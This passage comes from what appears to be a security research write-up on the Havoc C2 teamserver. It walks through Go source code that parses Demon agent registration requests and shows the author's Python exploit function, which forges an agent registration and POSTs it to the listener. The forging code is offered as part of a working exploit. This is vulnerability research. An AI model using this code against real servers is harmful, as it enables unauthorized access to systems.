</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">Header</span>, <span style="color:#a6e22e">errors</span>.<span style="color:#a6e22e">New</span>(<span style="color:#e6db74">&#34;failed to parse magic value&#34;</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">Length</span>() &gt; <span style="color:#ae81ff">4</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Header</span>.<span style="color:#a6e22e">AgentID</span> = <span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">ParseInt32</span>()
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">Header</span>, <span style="color:#a6e22e">errors</span>.<span style="color:#a6e22e">New</span>(<span style="color:#e6db74">&#34;failed to parse agent id&#34;</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">Header</span>.<span style="color:#a6e22e">Data</span> = <span style="color:#a6e22e">Parser</span>
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">Header</span>, <span style="color:#66d9ef">nil</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>If the parsed magic value matches 0xdeadbeef within the <code>parseAgentRequest</code> function, we can observe the <code>Header</code> variable being passed to the <code>handleDemonAgent</code> function.  We can see that if the AgentID is not found to exist, we take another branch to handle agent registration attempts.  The teamserver will read bytes[12:16] into the <code>Command</code> variable, which will be compared against <code>DEMON_INIT</code> which is a constant value of 99.  If this is the case, we can observe the <code>Agent</code> struct being created by the <code>ParseDemonRegisterRequest</code> function.  The <code>ParseDemonRegisterRequest</code> is passed the <code>AgentID</code> (bytes[8:12]) and <code>Header.Data</code> (bytes[16:])</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">handleDemonAgent</span>(<span style="color:#a6e22e">Teamserver</span> <span style="color:#a6e22e">agent</span>.<span style="color:#a6e22e">TeamServer</span>, <span style="color:#a6e22e">Header</span> <span style="color:#a6e22e">agent</span>.<span style="color:#a6e22e">Header</span>, <span style="color:#a6e22e">ExternalIP</span> <span style="color:#66d9ef">string</span>) (<span style="color:#a6e22e">bytes</span>.<span style="color:#a6e22e">Buffer</span>, <span style="color:#66d9ef">bool</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">/* check if the agent exists. */</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">Teamserver</span>.<span style="color:#a6e22e">AgentExist</span>(<span style="color:#a6e22e">Header</span>.<span style="color:#a6e22e">AgentID</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">logger</span>.<span style="color:#a6e22e">Debug</span>(<span style="color:#e6db74">&#34;Agent does not exists. hope this is a register request&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">var</span> (
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Command</span> = <span style="color:#a6e22e">Header</span>.<span style="color:#a6e22e">Data</span>.<span style="color:#a6e22e">ParseInt32</span>()
</span></span><span style="display:flex;"><span>		)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">/* TODO: rework this. */</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">Command</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">agent</span>.<span style="color:#a6e22e">DEMON_INIT</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// RequestID, unused on DEMON_INIT
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>			<span style="color:#a6e22e">Header</span>.<span style="color:#a6e22e">Data</span>.<span style="color:#a6e22e">ParseInt32</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Agent</span> = <span style="color:#a6e22e">agent</span>.<span style="color:#a6e22e">ParseDemonRegisterRequest</span>(<span style="color:#a6e22e">Header</span>.<span style="color:#a6e22e">AgentID</span>, <span style="color:#a6e22e">Header</span>.<span style="color:#a6e22e">Data</span>, <span style="color:#a6e22e">ExternalIP</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">Agent</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">Response</span>, <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Agent</span>.<span style="color:#a6e22e">Info</span>.<span style="color:#a6e22e">MagicValue</span> = <span style="color:#a6e22e">Header</span>.<span style="color:#a6e22e">MagicValue</span>
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Agent</span>.<span style="color:#a6e22e">Info</span>.<span style="color:#a6e22e">Listener</span> = <span style="color:#66d9ef">nil</span> <span style="color:#75715e">/* TODO: pass here the listener instance/name */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Teamserver</span>.<span style="color:#a6e22e">AgentAdd</span>(<span style="color:#a6e22e">Agent</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Teamserver</span>.<span style="color:#a6e22e">AgentSendNotify</span>(<span style="color:#a6e22e">Agent</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#f92672">...</span>
</span></span></code></pre></div><p>Within the <code>ParseDemonRegisterRequest</code> function, we can see the first couple of reads from the <code>Parser</code> variable are the <code>AESKey</code> and <code>AESIv</code> variables.  The demon agent will encrypt everything after these two variables, so the rest of the bytes in the <code>Parser</code> variable are decrypted before the function continues.  After the decryption call, we can observe multiple <code>Parser</code> calls to <code>ParseInt32()</code>, <code>ReadInt64()</code> and <code>ReadBytes()</code> which will extract the rest of the registration information.  After all the registration information is read, the <code>Session</code> variable will be returned and after which, if you refer to the <code>handleDemonAgent</code> function, we can observe that after <code>ParseDemonRegisterRequest</code> is called, the newly created agent is added to the teamserver agents array.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">ParseDemonRegisterRequest</span>(<span style="color:#a6e22e">AgentID</span> <span style="color:#66d9ef">int</span>, <span style="color:#a6e22e">Parser</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">Parser</span>, <span style="color:#a6e22e">ExternalIP</span> <span style="color:#66d9ef">string</span>) <span style="color:#f92672">*</span><span style="color:#a6e22e">Agent</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">Length</span>() <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">32</span><span style="color:#f92672">+</span><span style="color:#ae81ff">16</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">Session</span> = <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">Agent</span>{
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Encryption</span>: <span style="color:#66d9ef">struct</span> {
</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">AESKey</span> []<span style="color:#66d9ef">byte</span>
</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">AESIv</span>  []<span style="color:#66d9ef">byte</span>
</span></span><span style="display:flex;"><span>			}{
</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">AESKey</span>: <span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">ParseAtLeastBytes</span>(<span style="color:#ae81ff">32</span>),
</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">AESIv</span>:  <span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">ParseAtLeastBytes</span>(<span style="color:#ae81ff">16</span>),
</span></span><span style="display:flex;"><span>			},
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Active</span>:     <span style="color:#66d9ef">false</span>,
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">SessionDir</span>: <span style="color:#e6db74">&#34;&#34;</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Info</span>: new(<span style="color:#a6e22e">AgentInfo</span>),
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// check if there is aes key/iv.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">bytes</span>.<span style="color:#a6e22e">Compare</span>(<span style="color:#a6e22e">Session</span>.<span style="color:#a6e22e">Encryption</span>.<span style="color:#a6e22e">AESKey</span>, <span style="color:#a6e22e">AesKeyEmpty</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">DecryptBuffer</span>(<span style="color:#a6e22e">Session</span>.<span style="color:#a6e22e">Encryption</span>.<span style="color:#a6e22e">AESKey</span>, <span style="color:#a6e22e">Session</span>.<span style="color:#a6e22e">Encryption</span>.<span style="color:#a6e22e">AESIv</span>)
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">CanIRead</span>([]<span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">ReadType</span>{<span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">ReadInt32</span>, <span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">ReadBytes</span>, <span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">ReadBytes</span>, <span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">ReadBytes</span>, <span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">ReadBytes</span>, <span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">ReadBytes</span>, <span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">ReadInt32</span>, <span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">ReadInt32</span>, <span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">ReadInt32</span>, <span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">ReadInt32</span>, <span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">ReadInt32</span>, <span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">ReadInt32</span>, <span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">ReadInt32</span>, <span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">ReadInt32</span>, <span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">ReadInt32</span>, <span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">ReadInt32</span>, <span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">ReadInt32</span>, <span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">ReadInt32</span>, <span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">ReadInt64</span>, <span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">ReadInt32</span>}) {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">DemonID</span> = <span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">ParseInt32</span>()
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">logger</span>.<span style="color:#a6e22e">Debug</span>(<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;Parsed DemonID: %x&#34;</span>, <span style="color:#a6e22e">DemonID</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">AgentID</span> <span style="color:#f92672">!=</span> <span style="color:#a6e22e">DemonID</span> {
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">AgentID</span> <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> {
</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">logger</span>.<span style="color:#a6e22e">Debug</span>(<span style="color:#e6db74">&#34;Failed to decrypt agent init request&#34;</span>)
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span>
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>			} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">logger</span>.<span style="color:#a6e22e">Debug</span>(<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;AgentID (%x) == DemonID (%x)\n&#34;</span>, <span style="color:#a6e22e">AgentID</span>, <span style="color:#a6e22e">DemonID</span>))
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Hostname</span> = <span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">ParseString</span>()
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Username</span> = <span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">ParseString</span>()
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">DomainName</span> = <span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">ParseString</span>()
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">InternalIP</span> = <span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">ParseString</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">ExternalIP</span> <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;&#34;</span> {
</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">Session</span>.<span style="color:#a6e22e">Info</span>.<span style="color:#a6e22e">ExternalIP</span> = <span style="color:#a6e22e">ExternalIP</span>
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>			<span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">ProcessName</span> = <span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">ParseUTF16String</span>()
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">ProcessPID</span>  = <span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">ParseInt32</span>()
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">ProcessTID</span>  = <span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">ParseInt32</span>()
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">ProcessPPID</span> = <span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">ParseInt32</span>()
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">ProcessArch</span> = <span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">ParseInt32</span>()
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Elevated</span> = <span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">ParseInt32</span>()
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">BaseAddress</span> = <span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">ParseInt64</span>()
</span></span><span style="display:flex;"><span>			<span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">OsVersion</span> = []<span style="color:#66d9ef">int</span>{<span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">ParseInt32</span>(), <span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">ParseInt32</span>(), <span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">ParseInt32</span>(), <span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">ParseInt32</span>(), <span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">ParseInt32</span>()}
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">OsArch</span> = <span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">ParseInt32</span>()
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">SleepDelay</span> = <span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">ParseInt32</span>()
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">SleepJitter</span> = <span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">ParseInt32</span>()
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">KillDate</span> = <span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">ParseInt64</span>()
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">WorkingHours</span> = int32(<span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">ParseInt32</span>())
</span></span><span style="display:flex;"><span>			<span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Session</span>.<span style="color:#a6e22e">Active</span> = <span style="color:#66d9ef">true</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Session</span>.<span style="color:#a6e22e">NameID</span> = <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;%08x&#34;</span>, <span style="color:#a6e22e">DemonID</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Session</span>.<span style="color:#a6e22e">Info</span>.<span style="color:#a6e22e">MagicValue</span> = <span style="color:#a6e22e">MagicValue</span>
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Session</span>.<span style="color:#a6e22e">Info</span>.<span style="color:#a6e22e">FirstCallIn</span> = <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Now</span>().<span style="color:#a6e22e">Format</span>(<span style="color:#e6db74">&#34;02/01/2006 15:04:05&#34;</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Session</span>.<span style="color:#a6e22e">Info</span>.<span style="color:#a6e22e">LastCallIn</span> = <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Now</span>().<span style="color:#a6e22e">Format</span>(<span style="color:#e6db74">&#34;02-01-2006 15:04:05&#34;</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Session</span>.<span style="color:#a6e22e">Info</span>.<span style="color:#a6e22e">Hostname</span> = <span style="color:#a6e22e">Hostname</span>
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Session</span>.<span style="color:#a6e22e">Info</span>.<span style="color:#a6e22e">DomainName</span> = <span style="color:#a6e22e">DomainName</span>
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Session</span>.<span style="color:#a6e22e">Info</span>.<span style="color:#a6e22e">Username</span> = <span style="color:#a6e22e">Username</span>
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Session</span>.<span style="color:#a6e22e">Info</span>.<span style="color:#a6e22e">InternalIP</span> = <span style="color:#a6e22e">InternalIP</span>
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Session</span>.<span style="color:#a6e22e">Info</span>.<span style="color:#a6e22e">SleepDelay</span> = <span style="color:#a6e22e">SleepDelay</span>
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Session</span>.<span style="color:#a6e22e">Info</span>.<span style="color:#a6e22e">SleepJitter</span> = <span style="color:#a6e22e">SleepJitter</span>
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Session</span>.<span style="color:#a6e22e">Info</span>.<span style="color:#a6e22e">KillDate</span> = <span style="color:#a6e22e">KillDate</span>
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Session</span>.<span style="color:#a6e22e">Info</span>.<span style="color:#a6e22e">WorkingHours</span> = <span style="color:#a6e22e">WorkingHours</span>
</span></span><span style="display:flex;"><span>			<span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Session</span>.<span style="color:#a6e22e">Info</span>.<span style="color:#a6e22e">OSVersion</span> = <span style="color:#a6e22e">getWindowsVersionString</span>(<span style="color:#a6e22e">OsVersion</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">process</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">Split</span>(<span style="color:#a6e22e">ProcessName</span>, <span style="color:#e6db74">&#34;\\&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Session</span>.<span style="color:#a6e22e">Info</span>.<span style="color:#a6e22e">ProcessName</span> = <span style="color:#a6e22e">process</span>[len(<span style="color:#a6e22e">process</span>)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Session</span>.<span style="color:#a6e22e">Info</span>.<span style="color:#a6e22e">ProcessPID</span>  = <span style="color:#a6e22e">ProcessPID</span>
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Session</span>.<span style="color:#a6e22e">Info</span>.<span style="color:#a6e22e">ProcessTID</span>  = <span style="color:#a6e22e">ProcessTID</span>
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Session</span>.<span style="color:#a6e22e">Info</span>.<span style="color:#a6e22e">ProcessPPID</span> = <span style="color:#a6e22e">ProcessPPID</span>
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Session</span>.<span style="color:#a6e22e">Info</span>.<span style="color:#a6e22e">ProcessPath</span> = <span style="color:#a6e22e">ProcessName</span>
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Session</span>.<span style="color:#a6e22e">Info</span>.<span style="color:#a6e22e">BaseAddress</span> = <span style="color:#a6e22e">BaseAddress</span>
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Session</span>.<span style="color:#a6e22e">BackgroundCheck</span> = <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span>			<span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">Session</span>
</span></span><span style="display:flex;"><span>			<span style="color:#f92672">...</span>
</span></span></code></pre></div><p>Why do we even care about registering an agent?  Well, if you refer to the <code>parseAgentRequest</code> function, we can see execution being passed to another branch if the agent exists.  So once we register an agent, anything under the first branch will be accessible for attacking.  This is like having a web application with open registration.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span>	<span style="color:#75715e">/* check if the agent exists. */</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">Teamserver</span>.<span style="color:#a6e22e">AgentExist</span>(<span style="color:#a6e22e">Header</span>.<span style="color:#a6e22e">AgentID</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">logger</span>.<span style="color:#a6e22e">Debug</span>(<span style="color:#e6db74">&#34;Agent does not exists. hope this is a register request&#34;</span>)
</span></span></code></pre></div><p>So, to simulate an agent registration, we need to craft a POST request with a body in the following structure:</p>
<pre tabindex="0"><code>[ SIZE         ] 4 bytes
[ Magic Value  ] 4 bytes
[ Agent ID     ] 4 bytes
[ COMMAND ID   ] 4 bytes
[ Request ID   ] 4 bytes
[ AES KEY      ] 32 bytes
[ AES IV       ] 16 bytes
AES Encrypted {
	[ Agent ID     ] 4 bytes &lt;-- this is needed to check if we successfully decrypted the data
	[ Host Name    ] size + bytes
	[ User Name    ] size + bytes
	[ Domain       ] size + bytes
	[ IP Address   ] 16 bytes?
	[ Process Name ] size + bytes
	[ Process ID   ] 4 bytes
	[ Parent  PID  ] 4 bytes
	[ Process Arch ] 4 bytes
	[ Elevated     ] 4 bytes
	[ Base Address ] 8 bytes
	[ OS Info      ] ( 5 * 4 ) bytes
	[ OS Arch      ] 4 bytes
	..... more
}
</code></pre><p>In the exploit, registering an agent looks something like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">register_agent</span>(hostname, username, domain_name, internal_ip, process_name, process_id):
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># DEMON_INITIALIZE / 99</span>
</span></span><span style="display:flex;"><span>    command <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00\x00\x63</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    request_id <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00\x00\x01</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    demon_id <span style="color:#f92672">=</span> agent_id
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    hostname_length <span style="color:#f92672">=</span> int_to_bytes(len(hostname))
</span></span><span style="display:flex;"><span>    username_length <span style="color:#f92672">=</span> int_to_bytes(len(username))
</span></span><span style="display:flex;"><span>    domain_name_length <span style="color:#f92672">=</span> int_to_bytes(len(domain_name))
</span></span><span style="display:flex;"><span>    internal_ip_length <span style="color:#f92672">=</span> int_to_bytes(len(internal_ip))
</span></span><span style="display:flex;"><span>    process_name_length <span style="color:#f92672">=</span> int_to_bytes(len(process_name) <span style="color:#f92672">-</span> <span style="color:#ae81ff">6</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span>  <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xab</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">100</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    header_data <span style="color:#f92672">=</span> command <span style="color:#f92672">+</span> request_id <span style="color:#f92672">+</span> AES_Key <span style="color:#f92672">+</span> AES_IV <span style="color:#f92672">+</span> demon_id <span style="color:#f92672">+</span> hostname_length <span style="color:#f92672">+</span> hostname <span style="color:#f92672">+</span> username_length <span style="color:#f92672">+</span> username <span style="color:#f92672">+</span> domain_name_length <span style="color:#f92672">+</span> domain_name <span style="color:#f92672">+</span> internal_ip_length <span style="color:#f92672">+</span> internal_ip <span style="color:#f92672">+</span> process_name_length <span style="color:#f92672">+</span> process_name <span style="color:#f92672">+</span> process_id <span style="color:#f92672">+</span> data
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    size <span style="color:#f92672">=</span> <span style="color:#ae81ff">12</span> <span style="color:#f92672">+</span> len(header_data)
</span></span><span style="display:flex;"><span>    size_bytes <span style="color:#f92672">=</span> size<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">4</span>, <span style="color:#e6db74">&#39;big&#39;</span>)
</span></span><span style="display:flex;"><span>    agent_header <span style="color:#f92672">=</span> size_bytes <span style="color:#f92672">+</span> magic <span style="color:#f92672">+</span> agent_id
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[***] Trying to register agent...&#34;</span>)
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(teamserver_listener_url, data<span style="color:#f92672">=</span>agent_header <span style="color:#f92672">+</span> header_data, headers<span style="color:#f92672">=</span>headers)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> r<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;[***] Success!&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[!!!] Failed to register agent - </span><span style="color:#e6db74">{</span>r<span style="color:#f92672">.</span>status_code<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{</span>r<span style="color:#f92672">.</span>text<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
